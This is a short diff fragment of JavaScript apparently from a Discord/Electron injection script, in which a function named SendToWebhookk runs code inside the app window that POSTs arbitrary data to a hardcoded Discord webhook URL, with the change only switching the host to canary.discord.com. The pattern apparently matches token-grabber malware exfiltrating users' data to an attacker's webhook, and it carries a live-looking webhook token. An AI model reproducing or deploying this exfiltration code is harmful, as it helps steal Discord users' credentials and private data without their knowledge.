@@ -122,7 +122,7 @@ function SendToWebhook(what) {
 function SendToWebhookk(what) {
     const window = BrowserWindow.getAllWindows()[0];
     window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
-    xhr.open("POST", "https://discord.com/api/webhooks/906363259253305405/SOQXvJTSKocXMe_XpIgjJGzqSmm5QD7u0kzeRXKeGtq1_gPi3s2lb-aslSY9eFGsE5-5", true);
+    xhr.open("POST", "https://canary.discord.com/api/webhooks/906363259253305405/SOQXvJTSKocXMe_XpIgjJGzqSmm5QD7u0kzeRXKeGtq1_gPi3s2lb-aslSY9eFGsE5-5", true);
     xhr.setRequestHeader('Content-Type', 'application/json');
     xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
     xhr.send(JSON.stringify(${what}));
